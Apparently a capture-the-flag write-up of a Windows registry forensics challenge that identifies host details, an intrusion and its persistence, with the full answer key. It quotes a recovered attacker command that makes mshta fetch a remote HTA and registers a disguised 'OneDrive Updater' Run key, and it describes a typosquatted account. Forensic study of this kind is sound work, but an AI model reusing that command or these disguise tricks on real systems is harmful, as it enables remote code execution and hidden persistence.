# Disk Analysis - Windows - Registers

| | |
|---|---|
| **Platform** | Root-Me Pro |
| **Category** | Forensic / Disk Analysis |
| **Format** | 10 validated steps |
| **Files** | `Disk_Analysis_Windows_Registers.zip` (KAPE-style triage image) |
| **Suggested tool** | Autopsy (not used — `regipy` was faster) |

## Challenge

> A local shop reports unusual behaviour on a machine. A colleague went on-site and made a
> diagnostic image so you can analyse it from home. Analyse the triage image to understand
> what happened and identify any lingering issues.

Ten steps walk from basic host identification to the attacker's persistence and account
tampering.

## Approach

The archive is a triage collection, not a full disk image — no filesystem to mount, just
the artefacts KAPE would grab. Everything the challenge asks for lives in registry hives:

```
C/Windows/System32/config/{SOFTWARE,SYSTEM,SAM}
C/Users/Michel/NTUSER.DAT
```

Autopsy is suggested, but every answer is a single key lookup, so parsing the hives
directly with `regipy` is faster and scriptable:

```bash
unzip -q Disk_Analysis_Windows_Registers.zip -d extracted
pip install --break-system-packages regipy
```

```python
from regipy.registry import RegistryHive
h = RegistryHive("C/Users/Michel/NTUSER.DAT")
for v in h.get_key(r"\Software\Microsoft\Windows\CurrentVersion\Explorer\RunMRU").get_values():
    print(v.name, "=", v.value)
```

## What happened on the machine

One `RunMRU` entry — a command typed into the Win+R dialog — contains the entire attack:

```
cmd /c echo powershell.exe mshta http://10.10.10.10/rmpflags.hta > C:\ProgramData\Updater.ps1
  && reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run"
     /v "OneDrive Updater" /t REG_SZ /d "C:\ProgramData\Updater.ps1" /f
```

Two stages in one line:

1. **Drop** — write a one-liner to `C:\ProgramData\Updater.ps1` that invokes `mshta` against
   `http://10.10.10.10/rmpflags.hta`. `mshta.exe` is a signed Microsoft binary that executes
   remote HTA content, a standard LOLBin for pulling code past application allowlisting.
2. **Persist** — register that script under `HKCU\...\CurrentVersion\Run` with the value name
   `OneDrive Updater`, which sits directly beside the machine's genuine `OneDrive` entry:

```
'OneDrive'         = "C:\Users\Michel\AppData\Local\Microsoft\OneDrive\OneDrive.exe" /background
'OneDrive Updater' = C:\ProgramData\Updater.ps1
```

`Updater.ps1` itself is absent from the triage image — deleted after execution or quarantined.
The registry entry is the leftover, which is exactly what the later steps are driving at.

Separately, the SAM shows a typosquatted account created inside the same activity window:

```
WDAGUtilityAccount    <- genuine built-in (RID 0x1F8, created 2026-04-24)
WD4GUti1ityAccount    <- impostor      (RID 0x3EC, created 2026-04-26 09:50:46)
```

`A`→`4` and `l`→`1`. In an alphabetically sorted user list the two sit adjacent and read
as identical at a glance.

## Solution

| Step | Question | Registry source | Answer |
|---|---|---|---|
| 1 | Machine name | `SYSTEM\ControlSet001\Control\ComputerName\ComputerName` | `DESKTOP-13VQIIJ` |
| 2 | OS version | `SOFTWARE\Microsoft\Windows NT\CurrentVersion` → `ProductName`, `DisplayVersion` | Windows 10 Pro / 22H2 |
| 3 | Build number | same → `CurrentBuild` (`UBR` 2965) | `19045` |
| 4 | Install date | same → `InstallDate` = `1777030318` | 2026-04-24 11:31:58 UTC |
| 5 | Recent PDF opened by Michel | `NTUSER\...\Explorer\RecentDocs\.pdf` | `EN - Volatility cheatsheet v2.4.pdf` |
| 6 | Suspicious Run-dialog command | `NTUSER\...\Explorer\RunMRU` | `mshta.exe` |
| 7 | File set to run at logon | `NTUSER\...\CurrentVersion\Run` | `C:\ProgramData\Updater.ps1` |
| 8 | Leftover registry entry | same key — **value name** | `OneDrive Updater` |
| 9 | Suspicious account | `SAM\Domains\Account\Users\Names` | `WD4GUti1ityAccount` |
| 10 | Bernard's failed logins | SAM RID 0x3EA → `failed_login_count` | `10` |

`InstallDate` is a Unix epoch:

```python
datetime.datetime.fromtimestamp(1777030318, datetime.timezone.utc)  # 2026-04-24 11:31:58
```

## Dead ends worth recording

**Step 8 cost the most attempts.** The question says "registry entry", which reads as a key
path, so these went in first and all bounced:

```
HKCU\Software\Microsoft\Windows\CurrentVersion\Run     ❌
Software\Microsoft\Windows\CurrentVersion\Run          ❌
OneDrive Updater                                       ✅
```

It wanted the **value name**, not the key path.

**The trailing `\1` on the RunMRU value.** The stored string ends in literal bytes
`0x5c 0x31` — Windows' MRU slot marker, not a control character and not corruption. Time
went into deciding whether to include it in a submission. Step 6 turned out to want only
`mshta.exe`, so it never mattered, but it's the kind of detail that eats attempts on
exact-match validators.

## Lesson

- **Triage images are registry puzzles.** No filesystem to carve — go straight to the hives.
  `regipy` in a loop beats an Autopsy GUI session for anything scriptable.
- **`RunMRU` is a confession.** It records what a human typed into Win+R verbatim, including
  full attack one-liners. Check it early on any suspected hands-on-keyboard intrusion.
- **Persistence hides behind plausible names.** `OneDrive Updater` next to `OneDrive` is
  invisible unless you know the legitimate set. Same trick as `WD4GUti1ityAccount` — compare
  against known-good, don't eyeball.
- **`mshta` + remote HTA** is a durable LOLBin pattern: signed Microsoft binary, executes
  remote code, frequently unmonitored.
- **Read what the validator wants.** "Which registry entry" meant the value name. When an
  exact-match answer bounces, re-read the noun before regenerating the artefact.
